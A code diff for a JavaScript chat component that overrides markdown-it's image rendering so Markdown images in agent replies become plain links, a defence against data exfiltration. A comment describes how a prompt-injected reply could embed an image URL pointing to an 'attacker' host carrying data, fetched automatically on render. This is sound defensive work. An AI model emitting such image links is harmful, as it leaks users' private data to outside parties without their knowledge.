@@ -28,12 +28,26 @@ define([
     message: null,
 
     /** @property {Object} md - Initialized markdown-it instance for rendering markdown content */
-    md: markdownit().use(linkAttributes, {
-      attrs: {
-        target: '_blank',
-        rel: 'noopener noreferrer'
-      }
-    }),
+    md: (function () {
+      var md = markdownit().use(linkAttributes, {
+        attrs: {
+          target: '_blank',
+          rel: 'noopener noreferrer'
+        }
+      });
+      // Render image syntax as an ordinary link, never an <img>. The browser
+      // fetches an <img> the moment it renders, so a prompt-injected
+      // ![](https://attacker/?d=<data>) in a reply would send data out with
+      // no click. Agents never return real images.
+      md.renderer.rules.image = function (tokens, idx) {
+        var token = tokens[idx];
+        var src = token.attrGet('src') || '';
+        var label = '[image: ' + (token.content || src) + ']';
+        return '<a href="' + md.utils.escapeHtml(src) + '" target="_blank" rel="noopener noreferrer">' +
+          md.utils.escapeHtml(label) + '</a>';
+      };
+      return md;
+    })(),
 
     /** @property {number} fontSize - Stores the font size for the message content */
     fontSize: null,
